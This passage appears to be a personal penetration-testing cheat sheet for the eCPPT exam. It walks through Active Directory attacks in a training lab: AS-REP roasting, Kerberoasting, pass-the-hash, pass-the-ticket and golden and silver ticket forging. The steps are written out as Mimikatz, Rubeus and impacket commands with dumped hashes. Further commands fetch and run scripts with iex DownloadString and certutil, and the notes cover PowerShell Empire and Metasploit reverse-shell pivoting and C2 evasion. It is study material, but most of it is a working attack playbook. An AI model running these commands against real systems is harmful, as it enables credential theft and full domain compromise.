    # 2- Exploit AS-REP Roasting to extract password hashes.
    	#(Roasting)(Retrieving AS-REP Hash)
    .\Rubeus.exe asreproast /user:<Vulnrubleuser> /domain:<Domain>.local /format:<hashcatORjohn> /outfile:C:\*\hashes.txt
    .\Rubeus.exe asreproast /user:<Vulnrubleuser> /domain:<Domain>.local /format:<hashcatORjohn> /outfile:C:\*\hashes.txt
    
    # 3- Crack hashes for plaintext passwords. (AS-REP Hash Cracking)
    	# hashcat
    .\hashcat.exe -m **18200** C:\*\hashes.txt ..\pass.txt --quiet
    	# john
    .\john.exe hashes.txt --format=**krb5asrep** --wordlist=pass.txt
    ```
    
- Exploit process with impacket:
    
    ```powershell
    # 1- Identify user with "DO NOT PRE PRE AUTH" enabled
    powershell -ep bypass
    . .\PowerView.ps1
    Get-DomainUser | Where-Object { $_.UserAccountControl -Like "*DONT_REQ_PREAUTH*" }
    # 2- Exploit AS-REP Roasting to extract password hashes.
    ## This is one step process but utlizes a list of users to test for
    impacket-GetNPUsers SECURITY.local/Johnny -no-pass -dc-ip 10.0.0.101 -format john -outputfile C:\*\AsRepHash.txt
    impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep-hashes.txt
    ```
    
    ```powershell
    impacket-GetNPUsers <DOMAIN>/ -usersfile C:\*\Users.txt -format <hashcatORjohn> -outputfile C:\*hashes.txt
    # Specific User? replace userfile with "-user"
    # Remotely? add --dc-ip
    # Then crack with john or hashcat
    ```
    

### Kerberoasting (SPN)

- Kerbroasting attack attempts to obtain a password hash of AD account that has a Service Principal Name (”SPN”). Done by requesting a Kerberos ticket for an SPN, the retrieved Kerberos ticket encrypted with the hash of the service account password affiliated with the SPN.
- Exploit Process (Manually x Automatically)
    - Manually:
        1. Identify user accounts with Service Principal Name (SPN) enabled.
            
            `Get-NetUser | Where-Object {$_.serviceprincipalname} | fl`
            
            - Identify the targeted SPN to set it to add it in our session
                
                `setspn -T <FirstPartOfTheDomain> -Q **/**`
                
        2. Request a TGS ticket for the specified SPN using Kerberos.
            
            `Add-Type -AssemblyName System.IdentityModel`
            
            `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <TargetedSPN>`
            
            *NOTE: Kerbroasting doesnt require you with privileges to do using mimikatz!!*
            
            `Invoke-Mimikatz -Command '"kerberos::list /export"'`
            
        3. Crack the password from the TGS ticket
            1. `python .\kerberoast-Python3\tgsrepcrack.py .\10k-worst-pass.txt *@<TargetedSPN>&<Domain>~*.kirbi`
    - Automatically(Impacket):
        1. Identify user accounts with Service Principal Name (SPN) enabled.
            
            `impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip>`
            
        2. Request a TGS ticket for the specified SPN using Kerberos.
            
            `impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip> -request`
            
        3. Crack the password from the TGS ticket
            
            `hashcat -m 13100 spns_hashes.txt wordlist.txt`
            
            `john --wordlist=wordlist.txt spns_hashes.txt`
            

### DCSync

- It purpose to gain KRBTGT hash, done pre golden ticket attack
- Bloodhound → Dangerous Privileges → Find Principles with DCSync Rights

## AD Lateral Movement

### PtH

`‘”sekurlsa::pth/user:Administrator /domain:RESEARCH.SECURITY.local /ntlm:<AdministratorHash> /run:powershell.exe”'`

- What Should you know?
    - DC?
    - Your privilege? Can you ? sekurlsa::logonpasswords????
        - If you can’t you need to move laterally into another high priv account that can sekurlsa::logonpassowrds, and one of the ways is to **“Find-LocalAdminAccess”**
            - Which will give you computer that you can Enter-PSSession to it and extract NTLM hash from there
- Moving laterally: student → HighPriv  computer → student (W admin hash) → DC
1. Domain Enumeration (What is our domain? Who is the DC?)
    
    ```bash
    powershell -ep bypass
     . .\PowerView.ps1
     ##
     PS C:\Tools> Get-Domain
    Forest                  : SECURITY.local
    **DomainControllers       : {prod.research.SECURITY.local}**
    Children                : {}
    DomainMode              : Windows2012R2Domain
    DomainModeLevel         : 6
    Parent                  : SECURITY.local
    PdcRoleOwner            : prod.research.SECURITY.local
    RidRoleOwner            : prod.research.SECURITY.local
    InfrastructureRoleOwner : prod.research.SECURITY.local
    **Name                    : research.SECURITY.local**
    # DC => prod.research.SECURITY.local
    # Current Domain => research.SECURITY.local
     #####
    ```
    
2. Find a machine in the current domain that 'student(Me)' has **Local Admin access** on it that we can remote to , because student isn’t privilege to dump hashes
    
    ```bash
    PS C:\Tools> Find-LocalAdminAccess # => Most Important
    **seclogs.research.SECURITY.local**
    # Now access it via powershell remoting
    PS C:\Windows\system32> Enable-PSRemoting
    PS C:\Windows\system32> Enter-PSSession seclogs.research.SECURITY.local
    **## You are now Administrator in another computer**
    ## Transfer to the other computer (mimikatz, tokenmanipulation) via hfs
    iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1/')
    iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-TokenManipulation.ps1/')
    # OR
    certutil -f -urlcache http://10.0.5.101/Invoke-TokenManipulation.ps1 Invoke-TokenManipulation.ps1
    . .\Invoke-TokenManipulation.ps1
    ```
    
3. Enumerate all available tokens to impersonate (you have administrative access) 
    - Not that important but it helps in debugging I guess..
    
    ```bash
    Invoke-TokenManipulation -Enumerate
    # LogonType = 2 => He is currnetly Logged on
    ```
    
4. Get the NTLM Hash
    
    ```bash
    # Get the NTLM hash 
    Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
             * Username : Administrator
             * Domain   : RESEARCH
             * NTLM     : 84398159ce4d01cfe10cf34d5dae3909
             * SHA1     : ccc47c4f9541f99b020d38b8f7ea10f7b4b8595c
    ```
    
5. Perform Pass the Hash Attack
    
    ```bash
    # Run PS as Administrator
    powershell -ep bypass
    . .\Invoke-Mimikatz.ps1
    PS C:\tools> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:RESEARCH.SECURITY.local /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'
    
    **PS C:\Windows\system32> Enter-PSSession prod.research.SECURITY.local**
    # DC => prod.research.SECURITY.local
    [prod.research.SECURITY.local]: PS C:\Users\Administrator\Documents> whoami
    research\administrator
    [prod.research.SECURITY.local]: PS C:\Users\Administrator\Documents>
    ```
    

### PtT - Pass-The-Ticket

S**teal an existing Kerberos ticket (TGT or TGS)** from memory (usually LSASS) and **reuse it on another machine**. In order to access (e.g. file shares and other computers). No need to crack the target’s password and ***it helps in Lateral Movement so much***

**Without Administrative privileges, adversary can obtain the TGT (using “fake delegation”) and all TGS tickets for the current user. (e.g. `klist`, `kerberos::list`, `rubeus.exe dump`)**

Stealing → No Local Admin/SYSTEM

Dumping → Yes Local Admin/SYSTEM

NOTE: Local Admin/SYSTEM = current user is an admin on that computer `Find-LocalAdminAccess`

| Aspect | Dump Tickets | Pass-The-Ticket |
| --- | --- | --- |
| What is it | LSASS dumping | R**euse someone else’s ticket**. |
| Info Needed | none | Kirbi file, Domain name, VictemUsername |
| Privilege Needed | Local Admin/SYSTEM | none.. . I guess. |
| mimikatz | `privilege::debug sekurlsa::tickets /export` | `kerberos::ptt <TICKET.kirbi>` |
| Rubeus | `dump, , asktgt` | `ptt /ticket:*.kirbi` |
| Impacket | `lsassy` or `secretsdump` | **1-**`ticketConverter *.*kirbi *.**ccache`*…* **2-**`export KRB5CCNAME*=**ccache`… 3-`*exec(ps,wmi..etc) -k -no-pass` |
- To know what tickets you have access you have now whether it is TGS or TGT type `klist`
- Then access it directly!
- ***Pass-The-Ticket Attack Process***
    - **Objective: Execute a Pass-The-Ticket (PtT) attack by impersonating a user session, and gaining unauthorized access to escalate privileges within the Active Directory environment.**
    - **Task 1:** Conducting Reconnaissance
        
        ```powershell
        Get-Domain
        **DomainControllers       : {prod.research.SECURITY.local}**
        Name                    : research.SECURITY.local
        ```
        
    - **Task 2:** Attack Implementation
        - Student Can’t Dump/Export Tickets. Therefore we need
            
            ```powershell
            Find-LocalAdminAccess
            seclogs.research.SECURITY.local
            ## Run as administrator **PS Session**
            Enable-PSRemoting
            Enter-PSSession seclogs.research.SECURITY.local
            ```
            
    - **Task 3:** Export Kerberos ticket Using Mimikatz
        
        ```powershell
        certutil -f -urlcache http://10.0.5.101/Invoke-Mimikatz.ps1 Invoke-Mimikatz.ps1
        powershell -ep bypass
        . .\Invoke-Mimikatz.ps1
        # OR
        iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')
        ##
        Invoke-Mimikatz -Command '"privilege::debug"'
        Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
        dir | select name
        ```
        
    - **Task 4:** Check Domain Controller Access
        
        ```powershell
        Invoke-Mimikatz -Command '"kerberos::ptt *kirbi"'
        # Now We Can Impersonate the user! (Meterpreter Incognito?)
        > # Verify with ... 
        klist 
        
        [seclogs.research.SECURITY.local]: PS C:\Users\student\Documents> ls \\prod.research.SECURITY.local\c$
        
            Directory: \\prod.research.SECURITY.local\c$
        
        Mode                LastWriteTime         Length Name
        ----                -------------         ------ ----
        d-----        8/22/2013   3:52 PM                PerfLogs
        d-r---        10/1/2021   4:25 PM                Program Files
        d-----        9/21/2021  12:28 PM                Program Files (x86)
        d-r---        9/27/2021   9:00 AM                Users
        d-----        9/27/2021   9:19 AM                Windows
        > cd \\prod.research.SECURITY.local\c$\Users\Administrator\Desktop
        > pwd
        
        Path
        ----
        Microsoft.PowerShell.Core\FileSystem::\\prod.research.SECURITY.local\c$\Users\Administrator\Desktop
        ```
        

## AD Persistence - Golden & Silver Tickets

They exploit weaknesses in how Kerberos works and give an attacker long-term persistence **even after password changes**.

1. Dump the required hash (krbtgt/service).
2. Forge a ticket with Mimikatz/Rubeus/Impacket.
3. Demonstrate access (e.g. dir \\server\c$, or whoami /groups to prove DA).

| Aspect | **Golden Ticket** | **Silver Ticket** |
| --- | --- | --- |
| **What it is** | **Forged TGT (Ticket Granting Ticket)** | **Forged TGS (Ticket Granting Service Ticket)** |
| **Exploits** | Compromise of **KRBTGT account hash** | Compromise of **service account NTLM hash** |
| **Privileges Needed** | DA (Domain Admin) or SYSTEM-level access on a DC to dump `krbtgt` hash | Local SYSTEM/DA rights on a server to dump service account hash |
| **Access Level** | Domain-wide (can impersonate any user, incl. DA) | Limited to a specific service (CIFS, HTTP, HOST, MSSQL, etc.) |
| **Persistence** | Long-term (tickets valid until password/krbtgt reset — often years) | Medium-term (valid until the service account password changes) |
| **Detection** | Harder to detect, since ticket looks legit | Easier (tickets don’t contact KDC, anomaly in logs) |
| **Use Case** | Full domain persistence | Stealthy persistence into specific services (file servers, SQL, etc.) |
| Info Needed | Domain name, Domain SID, KRBTGT Hash, Username, UsernameToImpersonate | Domain name, Domain SID, Service NTLM Hash, Service SPN, UsernameToImpersonate |
| Vulnrability | Exploits trust in KRBTGT | Exploits **weak protection of service account hashes** |
| Mimikatz | `kerberos::golden` | `kerberos::golden` |
| Impacket | ticketer, Kekeo | ticketer, Kekeo |
| Rubeus | /golden | /silver |

### Silver Ticket

- Forging a narrow scoped ticket (Silver) without interacting with the KDC using the Service Account Password Hash
- forged for cifs to access \\DC01\C$ without DA credentials.
- Service account hashes dumbed from lsass

---

- Exploitation Process
    - Domain enumeration & SID → Find localadminaccess → Token enumeration (Who was logged on here?) → PtH to Administrator access (To get elevated session) → Find DC Pass hash → (in normal session) Generating and passing the generated TGS to have access to CIFS
    
    **Objective:** Perform a Silver ticket attack targeting the CIFS service on the Domain Controller.
    
    1. Domain Enumeration
        1. Domain Name
            
            ```powershell
            Get-Domain
            **DomainControllers       : {prod.research.SECURITY.local}**
            Name                    : research.SECURITY.local
            ```
            
        2. Domain SID
            
            ```powershell
            Get-DomainSID
            S-1-5-21-1693200156-3137632808-1858025440
            ```
            
    2. Service Enumeration (Need Higher privileges than student!)
        1. Get higher privileges (if needed) - Specifically, Admin Access we need. 
            
            ```powershell
            Find-LocalAdminAccess
            	seclogs.research.SECURITY.local
            Enable-PSRemoting
            Enter-PSSession seclogs.research.SECURITY.local
            
            [seclogs.*]: iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-TokenManipulation.ps1')
            [seclogs.*]: iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')
            
            ```
            
        2. Services tokens enumeration (To know what is your target Account or Privilege Esc) (Still idk why we need this…)
            
            ```powershell
            Invoke-TokenManipulation -Enumerate
            ```
            
        3. Get the Administrator Account NTLM Hash
            
            ```powershell
            Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
            
            * Username : Administrator
            * Domain   : RESEARCH
            * NTLM     : 84398159ce4d01cfe10cf34d5dae3909
            * SHA1     : ccc47c4f9541f99b020d38b8f7ea10f7b4b8595c
            ```
            
        4. Finding the Domain Controller Hash to generate the Silver Ticket 
            1. PtH using mimikatz for the administrator account
                
                ```powershell
                # with student powershell session
                Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:research.SECURITY.local /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'
                ```
                
                - Finding the Computer account password hash for the DC
                    
                    ```powershell
                    # With the new opened powershell session:
                    Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -ComputerName prod.research.SECURITY.local
                    RID  : 000003f1 (1009)
                    User : PROD$
                    
                     * Primary
                        NTLM : 57cacc834e550dbadf2f38280cd1f12a
                        LM   :
                      **Hash NTLM: 57cacc834e550dbadf2f38280cd1f12a** -> rc4
                    ```
                    
    3. Forging the ticket
        1. Service SPN # In CIFS no need for it
        2. Service NTLM Hash # In CIFS its as same as the PROD$ (DC) Hash 👍🏻
        3. Now, Forging & Passing the ticket
        
        ```powershell
        Invoke-Mimikatz -Command '"kerberos::golden /domain:prod.research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /target:prod.research.SECURITY.local /service:CIFS /rc4:57cacc834e550dbadf2f38280cd1f12a /user:administrator /ptt"'
        ```
        
    4. Passing the ticket
    5. Verifying DC CIFS Access 
        
        ```powershell
        PS C:\tools> ls \\prod.research.SECURITY.local\c$
        
            Directory: \\prod.research.SECURITY.local\c$
        
        Mode                LastWriteTime         Length Name
        ```
        

### Golden Ticket

- Gain almost unlimited access to an organization’s domain
- It exploits weakness in the Kerberos identity authentication protocol
- Exploit Process:
    
    **Objective: Simulate a Kerberos: Golden Ticket attack to generate a ticket-granting ticket, and escalate privileges to obtain domain controller access.**
    
    Below are the tasks that you need to perform:
    
    - **Task 1:** Extract Administrator's NTLM Hash and The domain SID
        
        ```powershell
        Invoke-Mimikatz -Command '"Privilege::debug" "sekurlsa::logonpasswords"'
        Authentication Id : 0 ; 233807 (00000000:0003914f)
        Session           : Interactive from 1
        User Name         : administrator
        Domain            : RESEARCH
        Logon Server      : PROD
        Logon Time        : 8/24/2025 7:47:08 AM
        SID               : S-1-5-21-1693200156-3137632808-1858025440-500
                msv :
                 [00000003] Primary
                 * Username : Administrator
                 * Domain   : RESEARCH
                 * NTLM     : 84398159ce4d01cfe10cf34d5dae3909
        ####
        Get-DomainSID
        S-1-5-21-1693200156-3137632808-1858025440
        ```
        
    - **Task 2:** Execute Pass-the-Hash Attack
        
        ```powershell
        Get-Domain | select Name
        research.SECURITY.local
        Get-Domain | select Domaincontrollers
        {prod.research.SECURITY.local}
        ##
        Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.SECURITY.local /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'
        ```
        
    - **Task 3:** Retrieve KRBTGT Account Hash
        - if you have dcsync privs ⇒ `lsadump::dcsync /user:krbtgt`
        - NOTE dcsync will give you access to access any user pass hash, i guess.
        
        ```powershell
        # With the elevated session (With any computer have access to DC)
        Invoke-Mimikatz -Command '"lsadump::lsa /patch /user:krbtgt"' -Computername prod.research.SECURITY.local
        User : krbtgt
        LM   :
        NTLM : 0e3cab3ba66afddb664025d96a8dc4d2
        ```
        
    - **Task 4:** Generate and Implement a Golden Ticket (TGT)
        
        ```powershell
        Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
        
        ```
        
        - /user ⇒ To whom the ticket
        - /sid ⇒ Domain SID
        - id & groups ⇒ Specify the user RID and group membership
            - 500 & 512 ⇒ These are the administrator standards
        - /startoffset: /endin:/renewmax: ⇒ Set the to maximum renewable time & expiration time
        - /ptt ⇒ Inject the ticket to our current session
    - **Task 5:** Validate Access to Domain Controller
        
        ```powershell
        klist
        # to purge the tickets in your session..
        klist purge
        # validating 
        ls \\prod.research.SECURITY.local\C$
        ```
        

## DCSync

- DCSync most often help to dump hashes!

# C2/C&C

- C2 Functionality:
    - Functionality:
        1. Establishing Communication Channels
            1. Server → channel → agents
            2. using http, https, dns, WebSockets, ..etc
        2. Remote Control, run scripts and Command Execution
        3. Persistence Mechanisms (Callback beacon)
        4. Lateral Movement  
        5. Privilege Escalation
        6. Data Exfiltration (Egress Traffic (internal → internet))
        7. Automation & Scripting (Repetitive tasks)
        8. Evasion Techniques (Firewall, IDS, Endpoint security solution)
        9. Payload Development
        10. Logging & Reporting (It tracks your activity for reporting (IMPORTANT!))⇒Important for debugging & analysis 
- ***Communication Models***
    - Centralized Model
        - (One primary C2 Server) nothing in between
        - Wiping in killing process (Kill switch) delete operation data
        - Used multi-channel stagers designed to establish communication with more than one C2 server simultaneously
    - P2P
        - Communication from the C2 server delivered though a web botnet
        - Relaying
        - One target as an egress traffic and relay traffic and commands through it to internal systems
        - Complex to manage
        - Havoc C2 Server
    - Out of Band/Overt (Trusted egress traffic)
        - Gmail, smtp.. etc.
        - Very stealthy
        - Leverages already existing communication protocols and social media platforms, IRC email to facilitate the communication
        - Need API keys to connect and authenticate thorough the email and smtp, and communication happens when smtp check for email and execute commands there (Trusted egress traffic)
    - Hybrid
        - Blended and complex for threat intelligence
- C2 Infrastructure Deployment
    - Factors:
        - Payload Delivery method (Client-Side Attacks)
            - Privilege Escalation or initial access? and what is the TTP will be using?
            - Know your target; To know what is the payload you will be using e.g.(Windows? Use PS empire.)
        - Client-Based Protections (What defenses are their? AV,EDR,HIDS)
            - Encoding & Obfuscation, Shellcode injection, Shellcode injection in memory using PowerSploit
            - Initial access without raising the alarm
        - Network-Based Protections (What defenses are their? Egress Filtering, IDS/IPS)
            - Modifying jitter, sleep time to blend with the traffic
            - Make communication with standard port (80,8080,443)
            - Using VPS on the internet
            - non-standard Legit DNS port 53
            - Domain Fronting & Domain Fronting Weaponization
                
                ![image.png](eCPPT-CheatSheet%2020164f6a487d80b4be37fd2315287b6e/image%202.png)
                
                - Setting up with cloudflare name services

### C2 Matrix

[https://howto.thec2matrix.com/](https://howto.thec2matrix.com/)

Questionnaire: [https://ask.thec2matrix.com/](https://ask.thec2matrix.com/) ⇒ Wonderful

- The C2 Matrix Framework: Aggregates all the C&C frameworks (Commercial and open-source) To know what features support & have based on a criteria

## PowerShell-Empire

- smbexec = psexec
- You can download and upload to agents
- PS-Empire is nothing like meterpreter!
    - Primarily for Red Teamers, Persistence access and other Post-Exp uses
- PS-Empire need two shells → Server + Client
    
    ```bash
    #Shell 1
    powershell-empire server
    #Shell 2
    powershell-empire client
    ```
    
- Adding a listener
    
    ```bash
    > uselistener http
    > set Host 10.10.45.8
    > execute
    # To view listeners
    > listeners
    # Go back to main page
    > main
    ```
    
    - Listeners:
        - http
    - Setting up a stager ⇒ For the listener
        
        ```bash
        > usestager multi/launcher
        > set Listener http
        > generate
        ```
        
        ```bash
        # After pasting it in our target session
        [+] New agent X8KY5LV6 checked in
        (Empire) > agents 
        # to view agents -> agents
        # for interacting 
        (Empire: agents) >interact X8KY5LV6 
        # Renaming:
        (Empire: agents) > rename CL5O1A2F PC1
        # After interacting with the agent, there is a help men
        (Empire: PC1) > help
        # For a histrocial view of executed commands
        (Empire: PC1) > view
        # Display last number of task results received.
        (Empire: PC1) > history
        # NOTE: Go out 'main' or 'back' then come again and tasks may done
        
        ```
        
        - Stagers:
            - Windows
                - Windows/cmd_exec # CMD code
                - Windows/csharp_exe # Executable
            - Linux
- Modules
    
    ```bash
    (Empire: agents) > usemodule
    # focus on -> Powershell/* & 
    # powershell/situational_awareness modules
    ```
    
    - Modules:
        - Most Used:
            - powershell/situational_awareness/*
            - Powershell/*
        - For pivoting use:
            - powershell/situational_awareness/network/portscan
        - For Metasploit payload (Web_delivery)
            - powershell/code_execution/invoke_metasploitpayload
        - For Persistence
        - Types:
            - Csharpserver: modules used for compiling CShap stagers
            - websockify:
            - Reverseshell_stager_server
        - Others:
            - Assembly
            - BOF
            - Mimikatz
            - Seatbelt
            - Rubeus
            - SharpSploit
            - Certify
            - Process Injection
- Setup:
    
    ```bash
    sudo apt install powershell-empire starkiller -y
    ```
    
    - PS-Empire Server:  Is the backend for the exploit and post-exp framework responsible for managing the listeners and callbacks and plugins.. etc
        - Agents: Target systems you’ve gained access to
            - Agents to view them
            - PowerShell
            - Python3
            - C#
            - IronPython3
        - Reverse Shell Methodology:
            - Listeners: Listening for the target once the stager executed.
                - Listeners to view them
                - dbx ⇒ Dropbox (Need API token)
                - http ⇒ standard
                - http_com ⇒ Hidden IE COM object
                - http_foreign ⇒ Inject Empire payloads
                - http_hop ⇒ Proxy
                - http_mapi ⇒ linnal utility
            - Stager: Piece of code executed on the target system contains info like Attacker/Listener IP Addr
                - bash
                - launcher
                - macro
                - jar
                - shellcode
                - Csharp_exe
                - dll
                - hta

### Basic Process of PowerShell Empire CLI Exploitation & Post-Exploitation Process

- **Use Empire to obtain a connection from the target via an Empire Agent**
    - Listener
        
        ```bash
        (Empire)> uselistener http
        (Empire: uselistener/http) > set Host lhost
        (Empire: uselistener/http) > set Port 8888
        (Empire: uselistener/http) > execute
        (Empire: uselistener/http) > main
        (Empire) > listeners
        
        ┌Listeners List──────┬───────────────────┬──────────────────────────────────────────┬─────────┐
        │ ID │ Name │ Module │ Listener Category │ Created At                               │ Enabled │
        ├────┼──────┼────────┼───────────────────┼──────────────────────────────────────────┼─────────┤
        │ 1  │ http │ http   │ client_server     │ 2025-08-23 04:20:19 IST (33 seconds ago) │ True    │
        └────┴──────┴────────┴───────────────────┴──────────────────────────────────────────┴─────────┘
        
        ```
        
    - Stager
        
        ```bash
        (Empire)> usestager multi/launcher
        (Empire: usestager/multi/launcher) > set Listener http
        (Empire: usestager/multi/launcher) > execute
        ```
        
    - Lets play along..
        
        ```bash
        (Empire) > agents
        
        ┌Agents──────────┬────────────┬─────────────┬──────────────────┬────────────┬──────┬───────┬─────────────────────────┬──────────┐
        │ ID │ Name      │ Language   │ Internal IP │ Username         │ Process    │ PID  │ Delay │ Last Seen               │ Listener │
        ├────┼───────────┼────────────┼─────────────┼──────────────────┼────────────┼──────┼───────┼─────────────────────────┼──────────┤
        │ 1  │ 2YE49LNA* │ powershell │ 10.6.21.65  │ WORKGROUP\SYSTEM │ powershell │ 1700 │ 5/0.0 │ 2025-08-23 05:24:13 IST │ http     │
        │    │           │            │             │                  │            │      │       │ (3 seconds ago)         │          │
        └────┴───────────┴────────────┴─────────────┴──────────────────┴────────────┴──────┴───────┴─────────────────────────┴──────────┘
        
        (Empire: agents) > rename 2YE49LNA DemoINE
        (Empire: agents) > agents
        
        ┌Agents─────────┬────────────┬─────────────┬──────────────────┬────────────┬──────┬───────┬─────────────────────────┬──────────┐
        │ ID │ Name     │ Language   │ Internal IP │ Username         │ Process    │ PID  │ Delay │ Last Seen               │ Listener │
        ├────┼──────────┼────────────┼─────────────┼──────────────────┼────────────┼──────┼───────┼─────────────────────────┼──────────┤
        │ 1  │ DemoINE* │ powershell │ 10.6.21.65  │ WORKGROUP\SYSTEM │ powershell │ 1700 │ 5/0.0 │ 2025-08-23 05:24:43 IST │ http     │
        │    │          │            │             │                  │            │      │       │ (3 seconds ago)         │          │
        └────┴──────────┴────────────┴─────────────┴──────────────────┴────────────┴──────┴───────┴─────────────────────────┴──────────┘
        
        # DemoINE* .. '*' means this agent have the highest privs
        (Empire: agents) > interact DemoINE
        (Empire: DemoINE) > info 
        (Empire: DemoINE) > help
        (Empire: DemoINE) > shell "<command>" 
        (Empire: DemoINE) > history
        	# execute history after RCE to skip time in between commadn
        
        ```
        
        - Modules
            
            ```bash
            (Empire: DemoINE) > usemodule <*>
            # Situational Awareness for local enumetaiotn 
            (Empire: <*>) > set agent <>  # and ten execute 
            ```
            
- **Exploit a second system that is not directly accessible. (Pivoting)**
    
    ```bash
    (Empire: usemodule/powershell/situational_awareness/network/portscan) > set Hosts
    list assignment index out of range
    (Empire: usemodule/powershell/situational_awareness/network/portscan) > set Agent DemoINE
    [*] Set Agent to DemoINE
    (Empire: usemodule/powershell/situational_awareness/network/portscan) > set Hosts 10.6.26.165
    [*] Set Hosts to 10.6.26.165
    (Empire: usemodule/powershell/situational_awareness/network/portscan) > execute
    [*] Tasked DemoINE to run Task 7
    (Empire: usemodule/powershell/situational_awareness/network/portscan) > history
    Hostname    OpenPorts          
    --------    ---------          
    10.6.26.165 80,3389,445,139,135 # <= File.server (unreachable-Was)
    
    # MSF
    msf6 exploit(multi/script/web_delivery) > set target 2
    target => 2
    msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
    payload => windows/meterpreter/reverse_tcp
    msf6 exploit(multi/script/web_delivery) > set lhost eth1
    lhost => 10.10.45.4
    msf6 exploit(multi/script/web_delivery) > exploit 
    [*] Exploit running as background job 0.
    [*] Exploit completed, but no session was created.
    
    [*] Started reverse TCP handler on 10.10.45.4:4444 
    [*] Using URL: http://0.0.0.0:8080/jSL5UzDu5oVT3Z
    [*] Local IP: http://10.10.45.4:8080/jSL5UzDu5oVT3Z
    
    # Back to Empire
    (Empire: usemodule/powershell/code_execution/invoke_metasploitpayload) > set Agent DemoINE
    [*] Set Agent to DemoINE
    (Empire: usemodule/powershell/code_execution/invoke_metasploitpayload) > set URL
    list assignment index out of range
    (Empire: usemodule/powershell/code_execution/invoke_metasploitpayload) > set URL http://10.10.45.4:8080/jSL5UzDu5oVT3Z
    [*] Set URL to http://10.10.45.4:8080/jSL5UzDu5oVT3Z
    (Empire: usemodule/powershell/code_execution/invoke_metasploitpayload) > execute
    # MSF
    [*] Meterpreter session 1 opened
    
    meterpreter > run autoroute -s 10.6.21.0/20
    
    [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
    [!] Example: run post/multi/manage/autoroute OPTION=value [...]
    [*] Adding a route to 10.6.21.0/255.255.240.0...
    [+] Added route to 10.6.21.0/255.255.240.0 via 10.6.21.65
    [*] Use the -p option to list all active routes
    
    msf6 auxiliary(server/socks_proxy) > set srvhost 10.10.45.4
    # srvport is 1080 ! 
    msf6 auxiliary(server/socks_proxy) > run
    # Configure Firefox socks port and host and access fileserver.ine.local !
    # It is vulnruble to Badblue on port 80
    msf6 exploit(windows/http/badblue_passthru) > set payload windows/meterpreter/bind_tcp
    payload => windows/meterpreter/bind_tcp
    msf6 exploit(windows/http/badblue_passthru) > set rhost fileserver.ine.local
    rhost => fileserver.ine.local
    msf6 exploit(windows/http/badblue_passthru) > run
    
    [*] Trying target BadBlue EE 2.7 Universal...
    [*] Started bind TCP handler against 10.6.26.165:4444
    [*] Sending stage (175174 bytes) to 10.6.26.165
    [*] Meterpreter session 2 opened (10.6.21.65:49702 -> 10.6.26.165:4444 via session 1) at 2025-08-23 05:51:11 +0530
    
    meterpreter > 
    meterpreter > migrate -N lsass.exe ## IMPORTANT (BE A PROFISIONAL PT)
    # Port Forwarding with Empire
    Empire: usemodule/powershell/lateral_movement/invoke_portfwd) >
    ```
    
- Exploitation:
- Post-Exploitation:
- StarKiller GUI
    - Port 1337, user: empireadmin, pass: password123
    - You can store creds in startkiller
    - Starkiller is easier than cli in searching for modules
    - You can browse files very easily
    - Powershell empire front-end, interactive, easier, browsing files
    - You can chat with you teammates in RTO
    
    ```bash
    powershell-empire server
    ```
    
    - Then open star killer
        - empireadmin:password123
